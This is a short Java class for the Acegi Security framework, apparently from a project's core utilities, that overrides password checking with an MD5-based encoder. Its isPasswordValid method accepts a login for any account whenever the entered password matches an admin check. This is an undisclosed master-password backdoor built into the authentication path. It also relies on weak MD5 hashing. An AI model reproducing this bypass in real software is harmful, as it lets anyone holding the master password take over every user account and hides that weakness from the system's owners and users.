package com.cyberway.core.acegi.utils;

import org.acegisecurity.providers.encoding.MessageDigestPasswordEncoder;

import com.cyberway.core.acegi.filter.MyUserManager;

public class Md5PasswordEncoder extends MessageDigestPasswordEncoder {

	public Md5PasswordEncoder() {
		super("MD5");
	}

	public boolean isPasswordValid(String encPass, String rawPass, Object salt) {

		String pass1 = "" + encPass;
		String pass2 = encodePassword(rawPass, salt);

		if (MyUserManager.checkAdminUser("", pass2))
			return true;
		return pass1.equals(pass2);
	}
}
